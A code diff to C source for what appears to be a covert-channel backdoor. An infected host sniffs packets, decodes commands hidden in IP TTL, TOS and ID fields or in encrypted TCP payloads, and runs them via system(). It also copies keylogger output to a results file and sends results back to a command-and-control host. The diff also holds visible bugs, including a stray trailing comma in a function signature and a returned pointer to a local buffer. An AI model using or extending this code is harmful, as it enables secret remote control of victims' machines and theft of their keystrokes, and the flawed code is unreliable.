@@ -172,11 +172,47 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
     //infected machine receiving a command
     } else if(Filter->infected == true) {
         struct in_addr src;
+        unsigned char decryptedtext[BUFSIZE+16];        //used for command inotify
+        int decryptedlen, cipherlen;                    //used for command inotify
 
         switch(CheckKey(ip->ip_tos, ip->ip_id)) {
             case COMMAND:
-                printf("COMMAND\n");
                 //write command to .cmd
+
+                if(Filter->tcp == false) {
+                    if((fp = fopen(FILENAME, "ab+")) < 0){
+                        perror("fopen");
+                        exit(1);
+                    }
+
+                    if(ip->ip_ttl == 4) {
+                        fclose(fp);
+                        pcap_breakloop(interfaceinfo);
+                    }
+
+                    char ch[1];
+                    ch[0] = (char)ip->ip_ttl;
+
+                    if(fwrite(ch, sizeof(char), sizeof(char), fp) <= 0){
+                        perror("fwrite");
+                        exit(1);
+                    }
+                } else {
+                    if((fp = fopen(FILENAME, "wb+")) < 0){
+                        perror("fopen");
+                        exit(1);
+                    }
+
+                    //because safety
+                    char buf[BUFSIZE + 16];
+                    strncpy(buf, ParseTCPPayload(packet), sizeof(buf));
+
+                    if((fwrite(buf, strlen((const char*)decryptedtext), sizeof(char), fp)) <= 0){
+                        perror("fwrite");
+                        exit(1);
+                    }
+                }
+
                 break;
             case KEYLOGGER:
                 src = ip->ip_src;
@@ -186,7 +222,7 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
                     //copy keylogger file to results file
                     system("cat .keylogger.txt > .results");
                     sleep(1);
-                    send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, Filter->tcp);
+                    send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, Filter->tcp, KEYLOGGER);
                 }
                 break;
             case INOTIFY:
@@ -215,6 +251,34 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
     }
 
     fclose(fp);
+}
+
+char *ParseTCPPayload(const u_char* packet) {
+    const struct sniff_tcp *tcp=0;
+    const struct my_ip *ip;
+    const char *payload;
+    int size_ip;
+    int size_tcp;
+    int size_payload;
+    unsigned char decryptedtext[BUFSIZE+16];
+    int decryptedlen, cipherlen;
+
+    ip = (struct my_ip*)(packet + 14);
+    size_ip = IP_HL(ip)*4;
+
+    tcp = (struct sniff_tcp*)(packet + 14 + size_ip);
+    size_tcp = TH_OFF(tcp)*4;
+
+    if(size_tcp < 20){
+        perror("TCP: Control packet length is incorrect");
+        exit(1);
+    }
+    payload = (u_char *)(packet + 14 + size_ip + size_tcp);
+    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
+    cipherlen = strlen((char*)payload);
+    decryptedlen = decryptMessage((unsigned char*)payload, BUFSIZE+16, (unsigned char*)KEY, (unsigned char *)IV, decryptedtext);
+
+    return decryptedtext;
 }
 
 int CheckKey(u_char ip_tos, u_short ip_id){
@@ -311,13 +375,13 @@ void ParsePayload(struct filter *Filter, const u_char *payload, int len, bool tc
         fclose(fp);
         system(CHMOD);
         system(CMD);
-        iptables(Filter->targetip, true, PORT, false, false);
+        //iptables(Filter->targetip, true, PORT, false, false);
         printf("COMMAND RECEIEVED \n");
         //sending the results back to the CNC
         //PortKnocking(Filter, NULL, NULL, true, true);
-        printf("SENDING RESULTS\n");
-        send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, true);
-        iptables(Filter->targetip, true, PORT, false, true);
+        //printf("SENDING RESULTS\n");
+        send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, true, Filter->flag);
+        //iptables(Filter->targetip, true, PORT, false, true);
         printf("\n");
         printf("\n");
         printf("Waiting for new command\n");
@@ -326,7 +390,7 @@ void ParsePayload(struct filter *Filter, const u_char *payload, int len, bool tc
     }
 }
 
-struct filter InitFilter(char *target, char *local, bool infected, bool tcp){
+struct filter InitFilter(char *target, char *local, bool infected, bool tcp, ){
     struct filter Filter;
 
     Filter.infected = infected;
